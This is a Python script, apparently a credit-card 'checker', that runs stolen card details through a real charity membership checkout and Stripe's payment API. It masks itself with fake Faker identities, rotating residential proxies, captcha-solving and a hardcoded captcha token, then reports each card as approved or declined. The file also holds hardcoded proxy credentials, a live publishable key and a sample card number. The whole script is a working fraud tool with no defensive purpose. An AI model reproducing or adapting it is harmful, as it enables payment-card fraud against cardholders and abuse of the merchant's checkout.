import ast
import email
from email import message
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c = requests.Session()

            c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            

            # Desactivar la verificación SSL (equivalente al -k de curl)
            c.verify = False

            # Permitir redirecciones (equivalente al -L de curl)
            c.max_redirects = 10
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                # 'Cookie': 'PHPSESSID=vp5j2udrtro2tpp2g70vnu0vjd; pmpro_visit=1; _referrer=www.google.com; __stripe_mid=1853803e-5539-4c32-a21f-8a3e4f5dc0a4f235c7; __stripe_sid=4fcff449-d3a0-4cca-ba72-59e46a02128cc3d31e',
                'Pragma': 'no-cache',
                'Referer': 'https://vessel.org.uk/membership-account/membership-levels/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'level': '3',
            }

            response = c.get(
                'https://vessel.org.uk/membership-account/membership-checkout/',
                params=params,
                headers=headers,
            )
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'type=card&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=1853803e-5539-4c32-a21f-8a3e4f5dc0a4f235c7&sid=4fcff449-d3a0-4cca-ba72-59e46a02128cc3d31e&pasted_fields=number&payment_user_agent=stripe.js%2F4d9faf87d7%3B+stripe-js-v3%2F4d9faf87d7%3B+split-card-element&referrer=https%3A%2F%2Fvessel.org.uk&time_on_page=153933&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1GOmfMA0gzfoyzxJ&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiTnBiamhTRzBIOW5Bc05DbEVuY2VVVVFlUlV4NmdyVkNQUmZOWTk5Z25SVlQ4dEhGUUQrNnZZc3BoV0g4SVcrdkZJRlVBM3pjZkh4cHV2R1hHcXI0MlNaQWdNL0g2THMvZzFTSGlrSTljbnZ3QTBsTDNSVVlVWnZVeVZPbmM3eFhHUnpySXBxNmZoQlBzTk52QUhTU2lGVWRzYW50RnYxQTgrbDlmQnNub1FBalJsM3lkTmQ0SjB4Zkt2S2RibXVCamsrNENoc1h3Um81MHlCVERWUTgrOWE1UWN6SjJPZ09zZ2Q5V2p4OUlyRzlxRk9Mc2RwTVVUTHdiTUI2TzIyVC84STdjd0lpczM5bmNjTFBCK2RtWGN0Vm1UREZLbUR1L3F2SW1CTzc3WjV0eGo3SENZSllDeDYrak5IVEdPNUp5eEthNGpvUnhqMjdyd1l1SlNVYk1kSWxiSVhkMWt6akVQYXk4ZXo1ZFZlNi9sZ0ltYk5CdldQUXhCbzdlVVJrVW95aHRmR2ZjWndEdnNUcnNqb2hWNC9ZZkp4MVhiRVpZT01lZGE3N2cwd2xYRjNuVEtPckFRUVBDUkJlWmtTcWxzMEo4L2pLYmppUmlBcWp6L1hDRXp6STU5TFc4ZUluSkVGVDBwTmc1SWdRNjlQV2lnMVFWYStndUw2QVVETk5ubFZJL0pJelJKbjNISTZtOWlZZWJ2aWt5eEhVb0xib3NpcUhWUHJ0WU1udUgzOXVkNUhZU0tsQzE5bXhRU1ViUFV4VkNnWHA0aTJCYUZ3MW01TEhYTFVaMFVZNS92dU1TMGFlQW41NGFFUDAyeVpTVWdTRWI5czkvOFcxKzcwemNLRW43VHNjZ1hSb1NBVjV2dmZKZWJONFJHZ1ZiOTc3QllTT1QwYTVKeGdSM0hYSmM0WXNpakwxaExhSUoxbWpFbGZlUm1uRjZKSm0zOHk5a2xXWERWZStuaDhHaDJBMVluSWlpTWJvR3dWUFhib2N1ZFo2OUR1ZnlOczZ4eGNmM0paNUh2SjdYb09YREtmZVF3Y3BtTFlNZVdNWkR5TG5iWmRLS0h6TDBEcGI3WWQ1N3FZb05SRDFoOWYzQ3BzSHZLRUJxY05hSDM2ZGZJY1paTlJNS05rWkdqM3g1ZGFQSmE0Q1pPUG5kSDdIamZlSnVrTmdCUE5ubXVQdExOSkRQbWpUeXZzZEVWMlpGSGlKaXNJTFNmMW1JWTZ1QTN3cmNuNE9NdHJJNVUraXlWcEt6aGFuVUhGRXE4cldMam90Z0NkSkZzRWlJQWZVQUVyRUhHemtENXlGVW1oNUdVUGdJYTRsSU1wcmFZdmFVZll6cmhSZlV1Zzhqb2J4UGxsenhjdDNjNkd6YWloRmNYQldUZnQ4V2txNXpsSHRMdkxWRDFMOVhNYm9nS1N2bmNHb1puVEZ4czRTQXA4RVExQ2ZqUktndVhVeVA2eDRtUnRqV2RjWGNUOW5BVWdBQmZvVm1lazZPc2JwMEpWSWtqaEpKYjc2V1BHT1RqbmNnZTJ4ZHFBRmZxUzhrbEJaeDZtekpKMUxpb0lGWGhKZ1kvZkg0bC9CZFZoQWVhZHozZmNObnVvNFBJWG5sVUpndzJ0WStGMmlGUDNtWk1xUDl1NG01OThVNUZXSHVmSHdGOUplN08yVU1nbFJMWEhIaWlPTE1XUUdQc25kQ0R5ZXdOdlNMRHlsVlhxZGIxNzZxR3pyMVk2WW5hSDdZRllOUHd2M1c3eUZrelJ4aFppRlFxalpLM1hkK1VJRG8vL0M3YmMwTU91ZDFnZlZzS3kxWGNqYkVacGdEdkVjeWZ5U3VBRFhTNmJrYnNlM1hmZ1ZWRC9ZK1JjOTczOHZ2R01RL25kRWV0NHI0S3dKWGFHM0hka3FTckhQUXhGREZoVXFvRDhhV25DenU0Z3ZkdTRMMmczZ0txd25TTmZUWkI4ckV2d0ViUDZSRHd1WGZCSTNLNVRHcWFiSXRvMFU2amVyckRJMmZndEJFSFJkYVZNYWh2SmZoM3FZYUttVzQ3MzkveFR6VkJtVEphRVpNL3lmTTQvQkJudDRlM21vbHhNVVZRUHdDbmp5cmNHTW44SGxCcXN0aTlHR0xGemxJM1owVEwza0hsZjArdmw0UHJ5OTVIdTJVeTdIamMvOU5IS0ZJd2ZDRHEzdlNCZ1d1YUNqMEpMaEVGY015R1RJZTh2a2NSVm42S25BVDk0NGFnOVprUVcyVWl0UDJ6M1VhdjdoeVhYd1c0L0l6QXhyREVXb1BHMk9uWTVyQUpNSXRnQ1pmbjNSNlJiSEdna0M5NlFBRnZLK0drV2s4TDlmRDdBTUZVM25ZQi9TNUdoQk5XL3l4REpQS1dsYXZUT3E3MVpQYkFHLzlzZUkxTEduNlhYcUtkdjIyYzV4c1c2WUdVRmc2d01QNDVyZTNvSCtuVHFpKzlsb0pDTXZnK2RvRGRXc25TbC8yb1VRRWE0Y3J0OXRsM0pUYWd1MDdwUnlobWdzK0RmQWJWMWE4UlgzUm94U3BzUS9SLzZvQktGR245Rmc0RW9namxHYkR2NmxkaHVjKzdQNkRXSDFaVHJxaStQcXZYVzJGdlhxZlZ4LzA5SGVsYkVqRERJdDNPbnNBT0I3ZnN3OGVVTGltc3JqZFBwdG1tSXBBOW45emVyb1JMcktqU2lnK2Z1VGZjN3V3dTEraVR1dFZURTdiR1MwaDZQYUI1cWZVa0pobU5LRHFuVkpTbmFwSzV6T09RQzdTMkxCTmtWTjJrdHMzZThOLzA1S05hNkZuUlVEZFhkT0dVeVJyK0RpdkVZOGttV3o2K1BTcVRCZWtoMitnQT09IiwiZXhwIjoxNzQzOTY5MDgzLCJzaGFyZF9pZCI6MjIxOTk2MDczLCJrciI6IjFkMzhlN2Q2IiwicGQiOjAsImNkYXRhIjoiTWg1ZHQvK3NBVXEyWDhQMEl0RkxqUkpLZ0Yrd1c1YUxoSTcwN2ZFTzdwY1krM1RGSWJLNU5hSmwrOWNSTDJOZ2Q2TWwvV3RMUjZlRThXUklVWlRNaTQ1eXlDakVoZzFwUWNhZy91cm5jWmRxU2xiRENST3k5NUI4Q1g1VDluRzlrUDZ1aWtCU0Y5SnZZTG5URVJUT2xSa2Q4Wlp0ajRWTnNKdGNJU0tNMW9qM2ZrK1JTZHpUUXNKR1dFSjA2K0R0VTZCOTh1THhnY25TUkNqaCJ9.e23hdvzWamiln90psFDzuyFjXTfu6bHdDBIFKVee8rw'

            response = c.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            responsePm = json.loads(response.text)
            tokenstr = responsePm['id']

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                # 'Cookie': 'PHPSESSID=vp5j2udrtro2tpp2g70vnu0vjd; pmpro_visit=1; _referrer=www.google.com; __stripe_mid=1853803e-5539-4c32-a21f-8a3e4f5dc0a4f235c7; __stripe_sid=4fcff449-d3a0-4cca-ba72-59e46a02128cc3d31e',
                'Origin': 'https://vessel.org.uk',
                'Pragma': 'no-cache',
                'Referer': 'https://vessel.org.uk/membership-account/membership-checkout/?level=3',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'level': '3',
            }

            data = {
                'level': '3',
                'checkjavascript': '1',
                'username': 'dljwwsk'+name+last,
                'password': 'Saiper123',
                'password2': 'Saiper123',
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'CardType': 'mastercard',
                'submit-checkout': '1',
                'javascriptok': '1',
                'payment_method_id': tokenstr,
                'AccountNumber': cc_number,
                'ExpirationMonth': mes,
                'ExpirationYear': ano_number,
            }

            responseChk = c.post(
                'https://vessel.org.uk/membership-account/membership-checkout/',
                params=params,
                headers=headers,
                data=data,
            )

            
            try:
                # Primer response con posible error
                soup = b(responseChk.text, 'html.parser')
                div_element = soup.select_one('div#pmpro_message.pmpro_message.pmpro_error')

                if div_element:
                    return(f"❌ Error: {div_element.text.strip()}")
                else:
                    # Si no hay error, hacemos la siguiente petición para confirmar membresía
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'es-ES,es;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'Pragma': 'no-cache',
                        'Referer': 'https://vessel.org.uk/membership-account/membership-checkout/?level=3',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }

                    params = {
                        'level': '3',
                    }

                    response_confirm = c.get(
                        'https://vessel.org.uk/membership-account/membership-confirmation/',
                        params=params,
                        headers=headers,
                    )

                    soup_confirm = b(response_confirm.text, 'html.parser')
                    title_tag = soup_confirm.find('title')

                    if title_tag and "Membership Confirmation" in title_tag.text:
                        return("✅ Approved")
                    else:
                        return("⚠️ No se encontró mensaje de error ni confirmación.")

            except Exception as e:
                return(f"❗ Ocurrió un error inesperado: {e}")
           
        


            
            
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("4189143233013773|01|2028|195"))